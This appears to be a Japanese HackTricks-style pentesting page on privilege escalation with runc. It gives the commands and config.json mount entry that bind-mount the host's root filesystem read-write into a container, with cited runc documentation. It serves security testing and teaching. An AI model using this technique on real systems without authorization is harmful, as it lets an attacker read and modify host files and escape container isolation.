# RunC 権限昇格

## 基本情報

**runc** について詳しく知りたい場合は、以下のページを確認してください。

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

ホスト上の rootful process で `runc` が利用可能な場合、ホストの `/` を container 内部の `/` に再帰的に bind-mount する mount configuration を持つ OCI bundle を使用できます。これにより、その mount namespace 内でホストの filesystem が公開されます。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> 文書化されている `runc run` ワークフローは rootful です。runc 自身の例では「run as root」と記載されています。非特権ユーザーには、`runc spec --rootless` のような rootless configuration が必要であり、runc の文書では、このモードを使用するには user namespaces を有効にする必要があると説明されています。<sup>[[1]](#references)</sup>

## References

- [1] [runc: コンテナを生成・実行するための CLI tool](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification: マウント](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [共有サブツリー](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
